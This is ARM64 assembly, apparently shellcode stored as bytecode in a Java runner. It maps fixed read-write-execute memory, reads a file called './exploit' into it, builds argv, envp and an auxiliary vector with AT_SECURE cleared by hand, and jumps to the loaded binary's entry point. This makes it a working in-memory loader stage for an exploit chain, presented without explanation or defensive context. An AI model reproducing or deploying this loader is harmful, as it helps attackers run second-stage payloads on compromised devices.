// corresponding arm bytecode is in the runner.java
// mmap(addr=0x200000, len=0x400000, prot=7, flags=0x32, fd=-1, off=0)
mov     x0, #0x200000 // addr = 0x200000
mov     x1, #0x400000 // length = 4MB
mov     x2, #7        // prot = PROT_READ | PROT_WRITE | PROT_EXEC
mov     x3, #0x32     // flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
mov     x4, #-1       // fd = -1
mov     x5, #0        // offset = 0
mov     x8, #222
svc     #0
mov     x19, x0       // x19 has base addr

// store "./exploit\0" on stack
sub     sp, sp, #0x30
movz    x2, #0x2f2e           // low 16 bits  ('.' '/')
movk    x2, #0x7865, lsl #16  // ex
movk    x2, #0x6c70, lsl #32  // pl
movk    x2, #0x696f, lsl #48  // oi
str     x2, [sp]              // store 8 bytes at sp
movz    w3, #0x0074           // t\0
str     w3, [sp, #8]          // store 4 bytes at sp+8
mov     x10, sp               // x10 points to "./exploit\0"

// openat(AT_FDCWD, sp, O_RDONLY)
mov     x0, #-100 // AT_FDCWD
mov     x1, sp    // "./exploit\0"
mov     x2, #0    // O_RDONLY
mov     x8, #56
svc     #0
mov     x20, x0

// read(fd=x20, buf=addr, count=0x200000)
mov     x0, x20                 // fd = returned fd
mov     x1, x19                 // buf = returned addr
movz    x2, #0x0000
movk    x2, #0x0040, lsl #16    // x2 = 0x00400000
mov     x8, #63
svc     #0

// setup stack for argc and argv etc...
sub     sp, sp, #0x40            // reserve space (align)
mov     x0, #1                   // x0 = argc = 1
str     x0, [sp]                 // argc

add     x1, sp, #0x8             // x1 = &argv[0]
str     x10, [x1]                // argv[0] = "./exploit"
mov     x2, #0                   // x2 = &argv[1]
str     x2, [x1, #8]             // argv[1] = NULL

add     x3, x1, #0x10            // envp = &argv[1] + 8
str     x2, [x3]                 // envp[0] = NULL

// build auxv:
// x4 will point to auxv[0].type (64-bit slot)
add     x4, x3, #8

mov     x5, #23          // AT_SECURE
str     x5, [x4]         // auxv[0].type = AT_SECURE
mov     x6, #0
str     x6, [x4, #8]     // auxv[0].val  = 0
add     x4, x4, #0x10    // advance to next auxv pair

mov     x5, #0
str     x5, [x4]         // auxv[n].type = AT_NULL
str     xzr, [x4, #8]    // auxv[n].val  = 0

// jump to loaded binary
ldr     x19, [x19, #0x18] // e_entry
mov     x0, #1           // argc
add     x1, sp, #8       // argv
sub     lr, lr, lr       // clear lr

br      x19

